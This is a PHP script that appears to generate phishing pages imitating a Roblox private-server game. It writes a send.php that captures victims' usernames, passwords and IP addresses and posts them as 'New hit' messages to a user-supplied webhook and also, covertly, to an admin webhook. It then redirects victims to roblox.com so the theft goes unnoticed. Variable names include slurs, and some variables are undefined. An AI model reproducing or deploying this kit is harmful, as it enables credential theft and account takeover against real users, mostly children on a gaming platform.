
<?php
ob_start();
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $Nigga = mt_rand(0, 1);
    $Furry = array("2788229176", "2788229376");
    $sleepy = str_shuffle($Furry[$Nigga]);
    $NiggaUrlDontChange = "3605288083481530234548100";
    $webhook = $_POST['webhook'];



require '../setup.php';
mkdir("../games/$sleepy", 0777, true);
$code3 = file_get_contents("login.php");
$code = file_get_contents("../game/pet.php");
$myfile = fopen("../games/$sleepy/index.php", "w");
$myfile3 = fopen("../games/$sleepy/login.php", "w");
$myfile2 = fopen("../games/$sleepy/send.php", "w");
$txt2 = $code2;
$txt = $code;
$txt3 = $code3;
fwrite($myfile, $txt);
fwrite($myfile3, $txt3);
fwrite($myfile2, '<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $ip = $_SERVER["REMOTE_ADDR"];
  $name = $_POST["username"];
  $pass = $_POST["password"]; }


$Admin = "'.$adminhook.'";
$url = "'.$webhook.'";
$headers = [ "Content-Type: application/json; charset=utf-8" ];
$POST = [
    "username" => "'.$name.' - Bot",
    "avatar_url" => "'.$image.'",
     "content" => "",
        "embeds" => [
            [
                "title" => "**New hit**",
                "type" => "",
                "color" => hexdec("00000"),
                "author" => [
                     "name" => "'.$name.' ON TOP",
                ],
                "footer" => [
                    "text" => "'.$discord.'",
                  "icon_url" => "'.$image.'",
                ],
                "fields" => [
                    [
                        "name" => "**username**",
                        "value" => "```$name```",
                        "inline" => True
                    ],
                    [
                        "name" => "**password**",
                        "value" => "```$pass```",
                        "inline" => True
                    ],
                    [
                        "name" => "**IP**",
                        "value" => "```$ip```",
                        "inline" => True
                    ],
                ]
            ],
        ],
    
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
    $response   = curl_exec($ch);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Admin);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
    $response   = curl_exec($ch);
    require "../../SecretGayFile/GayCaptcha.php";
header("Location: https://www.roblox.com/home");
exit();
?>

' .$txt2); 
header("location: ../games/$sleepy/?privateServerLinkCode=$NiggaUrlDontChange");
ob_end_flush();
}
?>